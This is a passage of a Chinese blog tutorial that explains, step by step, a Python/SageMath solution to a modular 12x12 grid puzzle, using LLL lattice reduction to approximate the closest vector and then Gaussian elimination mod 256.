<span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">144</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">142</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">100</span>, <span class=\"number\">142</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">142</span>, <span class=\"number\">142</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">59</span>, <span class=\"number\">142</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">    [<span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">33</span>, <span class=\"number\">33</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>, <span class=\"number\">189</span>],</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">level01_val</span>(<span class=\"params\">i, j, x, y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (x == i <span class=\"keyword\">or</span> y == j):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">3</span> - (<span class=\"built_in\">abs</span>(x - i) + <span class=\"built_in\">abs</span>(y - j))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">level2_val</span>(<span class=\"params\">i, j, x, y</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [<span class=\"number\">31</span>, <span class=\"number\">63</span>, <span class=\"number\">127</span>][<span class=\"built_in\">max</span>(<span class=\"built_in\">abs</span>(x - i), <span class=\"built_in\">abs</span>(y - j))]</span><br><span class=\"line\"></span><br><span class=\"line\">levels = [</span><br><span class=\"line\">    (level01_val, <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>),</span><br><span class=\"line\">    (level01_val, <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">..X.X.......</span></span><br><span class=\"line\"><span class=\"string\">..XXX.......</span></span><br><span class=\"line\"><span class=\"string\">..X.X.......</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">.......XXX..</span></span><br><span class=\"line\"><span class=\"string\">.......X....</span></span><br><span class=\"line\"><span class=\"string\">.......X.X..</span></span><br><span class=\"line\"><span class=\"string\">.......XXX..</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>),</span><br><span class=\"line\">    (level2_val, <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">..X.X...XX..</span></span><br><span class=\"line\"><span class=\"string\">..X.X...X...</span></span><br><span class=\"line\"><span class=\"string\">..XXX..XX...</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">..XXX..XXX..</span></span><br><span class=\"line\"><span class=\"string\">...X...X....</span></span><br><span class=\"line\"><span class=\"string\">...X...XXX..</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">............</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>)</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">id</span>(<span class=\"params\">x, y</span>): <span class=\"keyword\">return</span> x * <span class=\"number\">12</span> + y</span><br><span class=\"line\"></span><br><span class=\"line\">level_id = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">ban = <span class=\"built_in\">list</span>(<span class=\"built_in\">map</span>(<span class=\"keyword\">lambda</span> x: [y == <span class=\"string\">&#x27;X&#x27;</span><span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> x], levels[level_id][<span class=\"number\">1</span>].split()))</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><code>from sage.all import *</code><br>首先要<strong>安装 Sagemath</strong>，因为 Sagemath 在 Windows 下运行也是要虚拟出一个 Unix 环境，故建议在 WSL 里 <code>sudo apt install sagemath</code> ，可能中途要 <code>apt-get upgrade</code> 。</li>\n<li><code>sys.argv[1]</code><br><code>argv[0]</code> 是脚本名称（它是否为完整路径名取决于操作系统）。则 <code>argv[1]</code> 为省去后缀名的文件名，如 Level0 时为脚本名为 <code>0.py</code> ， <code>argv[1]</code> 为 0 。</li>\n<li><code>ban = list(map(lambda x: [y == &#39;X&#39;for y in x], levels[level_id][1].split()))</code><br><code>lambda</code> 是 Python 的一个关键字，可以用来定义<strong>匿名函数</strong>。<br>所谓匿名函数，就是没有名字的函数，与命名函数类似，都有参数和返回值，只是没有名字。<br>如 <code>add=lambda x, y: x+y</code> 这个函数就将传入的两个参数相加，返回结果，即 <code>add(1, 2)</code> 等于 <code>1+2</code> ； <code>map(lambda x: x+1, [1, 2, 3])</code> 将列表 [1, 2, 3] 中的元素分别加 1 ，其结果 [2, 3, 4] 。<br>这里 <code>map(lambda x: [y == &#39;X&#39;for y in x], levels[level_id][1].split())</code> 一句是将上面定义的 12 阶方阵中 <code>X</code> 转为 <code>True</code> ， <code>.</code> 转为 <code>False</code> ，然后放入一个列表 <code>ban</code> 中，此时 <code>ban</code> 为两级列表。</li>\n</ul>\n</li>\n<li><p><strong>准备矩阵系数</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">m = []</span><br><span class=\"line\">free = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ban[i][j]:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        free.append((i, j))</span><br><span class=\"line\">        t = [<span class=\"number\">0</span>] * <span class=\"number\">144</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i - <span class=\"number\">2</span>, i + <span class=\"number\">3</span>):</span><br><span class=\"line\">            <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(j - <span class=\"number\">2</span>, j + <span class=\"number\">3</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (<span class=\"number\">0</span> &lt;= x &lt; <span class=\"number\">12</span>) <span class=\"keyword\">and</span> (<span class=\"number\">0</span> &lt;= y &lt; <span class=\"number\">12</span>):</span><br><span class=\"line\">                    t[<span class=\"built_in\">id</span>(x, y)] = levels[level_id][<span class=\"number\">0</span>](i, j, x, y)</span><br><span class=\"line\">        m.append(t + [<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p><code>levels[level_id][0](i, j, x, y)</code><br>这里是在元组里放函数，注意到上面的 <code>Levels=[(levev01_val, &#39;&#39;&#39;...&#39;&#39;&#39;),(...),(...)]</code> ，所以 <code>levels[level_id][0]</code> 是 <code>levev01_val</code> 函数。这样的用法如：</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">x,y</span>):<span class=\"keyword\">return</span> x+y</span><br><span class=\"line\">tup=(add,<span class=\"number\">1</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(tup[<span class=\"number\">0</span>](tup[<span class=\"number\">1</span>],tup[<span class=\"number\">2</span>]))</span><br><span class=\"line\"><span class=\"comment\"># 3</span></span><br></pre></td></tr></table></figure>\n\n<p>  list也可以实现类似操作，Python确实花.jpg。</p>\n</li>\n</ul>\n<p> 不难发现， free[] 里放的是可以点的坐标，如 $(0,0),(0,1)…$<br> 注意到， <code>level01_val</code> 函数在上面已经定义：</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">level01_val</span>(<span class=\"params\">i, j, x, y</span>):</span><br><span class=\"line\"><span class=\"keyword\">if</span> (x == i <span class=\"keyword\">or</span> y == j):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">3</span> - (<span class=\"built_in\">abs</span>(x - i) + <span class=\"built_in\">abs</span>(y - j))</span><br><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p> 这个函数的参数中 <code>i,j</code> 为操作的点(即按下的点)坐标， <code>x,y</code> 为受影响的点坐标，<strong>返回值为受影响坐标的增量</strong>。<br> 如 <code>(i,j)</code> 为 $(2,3)$ 时，若 <code>x,y</code> 为 $(2,3)$ ，则根据规则，返回值为 3 ，若 <code>x,y</code> 为 $(2,4)$ ，则返回值为 2 ，若 <code>x,y</code> 为 $(3,3)$ ，则返回值为 2 ，若 <code>x,y</code> 为 $(3,4)$ ，则返回值为 0 。如下表：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">x\\y\\返回值</th>\n<th align=\"center\">2</th>\n<th align=\"center\">3</th>\n<th align=\"center\">4</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">1</td>\n<td align=\"center\">0</td>\n<td align=\"center\">2</td>\n<td align=\"center\">0</td>\n</tr>\n<tr>\n<td align=\"center\">2</td>\n<td align=\"center\">2</td>\n<td align=\"center\">3</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">3</td>\n<td align=\"center\">0</td>\n<td align=\"center\">2</td>\n<td align=\"center\">0</td>\n</tr>\n</tbody></table>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i - <span class=\"number\">2</span>, i + <span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> y <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(j - <span class=\"number\">2</span>, j + <span class=\"number\">3</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"number\">0</span> &lt;= x &lt; <span class=\"number\">12</span>) <span class=\"keyword\">and</span> (<span class=\"number\">0</span> &lt;= y &lt; <span class=\"number\">12</span>):</span><br><span class=\"line\">            t[<span class=\"built_in\">id</span>(x, y)] = levels[level_id][<span class=\"number\">0</span>](i, j, x, y)</span><br><span class=\"line\">m.append(t + [<span class=\"number\">0</span>])</span><br></pre></td></tr></table></figure>\n\n<p> 上面已经定义函数 <code>def id(x, y): return x * 12 + y</code> ，即 <code>id</code> 函数把给定的<strong>坐标</strong>转为方阵<strong>一维展开后的位置</strong>，则此处把每个操作点对整个方阵 144 个位置影响(增量)后面补一个 0 （下面会解释为什么加一个 0 ）放入 <code>t[]</code> 中，此时t可以看作一个<strong>向量</strong>。<br> 每个 <code>t[]</code> 补入 <code>m[]</code> 后，此时 $m$ 是一个 (144-16)x(144+1) 即 <strong>128x145</strong> 的矩阵，且第 145 列全为 0 ( 16 为 X 即<strong>不可操作点的数量</strong>)，如下：<br> $$<br> m=\\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 \\\\<br> 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 \\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0<br> \\end{pmatrix}<br> $$</p>\n<p> <strong>注意：上面打省略号的地方不全为0！</strong><br> 比如第一行是由如下一个 12x12 的矩阵展开为一维形式：<br> $$<br> \\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 2 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 \\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0<br> \\end{pmatrix}<br> $$</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>):</span><br><span class=\"line\">    m.append([(i == j) * <span class=\"number\">256</span> <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>)] + [<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">t = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">12</span>):</span><br><span class=\"line\">        t.append(target[i][j])</span><br><span class=\"line\">C = <span class=\"number\">256</span></span><br><span class=\"line\">m.append([-x <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> t] + [C])</span><br></pre></td></tr></table></figure>\n\n<p> 不难看出，此时的 $m$ 为如下形式：<br> $$<br> m=\\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 3 &amp; 0\\\\<br> 256 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 256 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 0 &amp; 256 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 0 &amp; 0 &amp; 256 &amp; 0 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 256 &amp; \\cdots &amp; 0 &amp; 0\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 256 &amp; 0 \\\\<br> -189 &amp; -189 &amp; -189 &amp; -189 &amp; -189 &amp; \\cdots &amp; -189 &amp; 256\\\\<br> \\end{pmatrix}<br> $$</p>\n<p> 此时矩阵 $m$ 的前 272 个行向量(即除开最后一个行向量)的<strong>整系数线性组合</strong>即为操作后可以得到的方阵化为一维后的向量， Level0 时只需令该向量与解向量相等，而 Level1 和 Level2 则需要算出离解向量<strong>最近</strong>的可由<strong>这 272 个向量整数系线性表出的向量</strong>作为<strong>新的解向量</strong>，因为我们<strong>不保证在一些点不可操作的前提下仍能整数系线性表出解向量</strong>(<strong>重点，敲黑板</strong>) 。<br> 同时由于题目在模意义下进行，所以若解出的系数为负整数也可以模 256 化为正整数。<br> 而 $m$ 的最后一个行向量为负的解向量，这里留给后面解释。</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">n = <span class=\"built_in\">len</span>(m)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;pre ok&#x27;</span>)</span><br><span class=\"line\">m2 = Matrix(m).LLL()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&#x27;lll ok&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p> 这里 n 取得 m 的行向量数，即 (144-16+144+1)=273 ，然后对 m 跑 LLL 算法进行格基规约，仍然得到一个 273x145 的矩阵。</p>\n<hr>\n<blockquote>\n<p>我最常用的求 CVP 的近似解的办法是，给原来每个向量后面加个 0，然后再加个新向量，前面的位置是欲求 CVP 的向量，最后是一个很大的常数。给这个新的格跑一遍 LLL，结果中最后是大常数的那一行，就是我们想要的答案。—— mcfx</p>\n</blockquote>\n<p> <strong>这就是为什么最后要补一列零向量的原因。</strong></p>\n<hr>\n<p> 同时上面有一个细节，那就是 $m$ 的最后一个行向量为负的解向量，结合神的解释，我发现，若矩阵中最后一个行向量的最后一个维度为大常数，其他行向量的最后一个维度为 0 ，那么 LLL 后最后这个行向量只是与其他行向量的线性组合进行<strong>一次相加(或相减)<strong>，也就是说，这个方法将 CVP 化为 SVP 问题时，</strong>求解 SVP 的过程中不会对这个特殊行向量进行任何数乘！</strong> 那么将这个向量直接乘上-1然后加上原来的解向量再抹去最后一维就是CVP的解了。<br> 同时我观察了 m2 (即 <code>m.LLL</code> 后的结果)的特征，发现 273 个行向量中的 128 个均为零向量，恰为 273-145 个。这里有一个有趣的问题，那就是<strong>这 273 组基是否可以互相线性表出</strong>。</p>\n<p> 在线性代数中，一般的，我们在欧几里得空间即<strong>实数域</strong>里讨论向量的<strong>实数系</strong>组合问题，此时 145 维向量空间里的每个向量都可以由 145 个线性无关的向量线性表出。而格中是在向量的<strong>整数系</strong>组合下讨论问题，此时情况就有所不同了，比如以 $(1,1)$ 和 $(-1,1)$ 为基张成的格并不包括 $(1,0)$ 等向量，即不存在整数 $m,n$ 满足 $m*(1,1)+n*(-1,1)=(1,0)$ 。</p>\n</li>\n<li><p><strong>找到 CVP 的答案</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(n):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> m2[i][<span class=\"number\">144</span>]:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>):</span><br><span class=\"line\">            m[-<span class=\"number\">1</span>][j] = m2[i][j] - m[-<span class=\"number\">1</span>][j]</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"built_in\">sum</span>(<span class=\"built_in\">abs</span>(m2[i][j]) <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>)))</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n\n<p> 由上面分析可知，此时 <code>m[-1]</code> 的前 144 维就是<strong>新的解向量</strong>。至此， Level1 和 Level2 就可以化为 Level0 的解法了。</p>\n</li>\n<li><p><strong>跑高斯消元求解</strong></p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">s = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">144</span>):</span><br><span class=\"line\">    t = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free)):</span><br><span class=\"line\">        t.append(m[j][i])</span><br><span class=\"line\">    t.append(m[-<span class=\"number\">1</span>][i] % <span class=\"number\">256</span>)</span><br><span class=\"line\">    s.append(t)</span><br></pre></td></tr></table></figure>\n\n<p> 上面知道 <code>free[]</code> 是可以操作的点的坐标列表，故 <code>len(free[])</code> 即为 144-16=128 。<br> 这里取 $m$ 的前 (144-16)=128 个行向量的前 144 维进行<strong>转置</strong>作为系数矩阵与 $m$ 的最后一行向量的前 144 维变为列向量，合成增广矩阵，即为一个标准的非齐次线性方程组，即 $s$ 为一个如下的 144x145 的矩阵：<br> $$<br> s=\\begin{pmatrix}<br> 3 &amp; 2 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> 2 &amp; 3 &amp; 2 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 190\\\\<br> 1 &amp; 2 &amp; 3 &amp; 2 &amp; 1 &amp; \\cdots &amp; 0 &amp; 191\\\\<br> 0 &amp; 1 &amp; 2 &amp; 3 &amp; 2 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 3 &amp; 189<br> \\end{pmatrix}<br> $$</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free)):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, <span class=\"number\">144</span>):</span><br><span class=\"line\">        <span class=\"keyword\">while</span> s[j][i]:</span><br><span class=\"line\">            t = s[i][i] // s[j][i]</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                s[i][k], s[j][k] = s[j][k], (s[i][k] - s[j][k] * t) % <span class=\"number\">256</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free), <span class=\"number\">144</span>):</span><br><span class=\"line\">    <span class=\"keyword\">assert</span> s[i][<span class=\"built_in\">len</span>(free)] == <span class=\"number\">0</span></span><br></pre></td></tr></table></figure>\n\n<p> 经以上消元后 $s$ 的第 129 行到最后一行均为 0 ，且系数矩阵与增广矩阵等秩，方程组有唯一解， $s$ 为如下的上三角矩阵：<br> $$<br> s=\\begin{pmatrix}<br> 1 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 188\\\\<br> 0 &amp; 1 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 188\\\\<br> 0 &amp; 0 &amp; 1 &amp; 0 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> 0 &amp; 0 &amp; 0 &amp; 1 &amp; 0 &amp; \\cdots &amp; 0 &amp; 189\\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 1 &amp; \\cdots &amp; 0 &amp; 190\\\\<br> \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\vdots &amp; \\ddots &amp; \\vdots &amp; \\vdots \\\\<br> 0 &amp; 0 &amp; 0 &amp; 0 &amp; 0 &amp; \\cdots &amp; 1 &amp; 127<br> \\end{pmatrix}<br> $$</p>\n <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ans = [<span class=\"number\">0</span>] * <span class=\"built_in\">len</span>(free)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(free) - <span class=\"number\">1</span>, -<span class=\"number\">1</span>, -<span class=\"number\">1</span>):</span><br><span class=\"line\">    t = s[i][<span class=\"built_in\">len</span>(free)]</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(i + <span class=\"number\">1</span>, <span class=\"built_in\">len</span>(free)):</span><br><span class=\"line\">        t = (t - ans[j] * s[i][j]) % <span class=\"number\">256</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">256</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> j * s[i][i] % <span 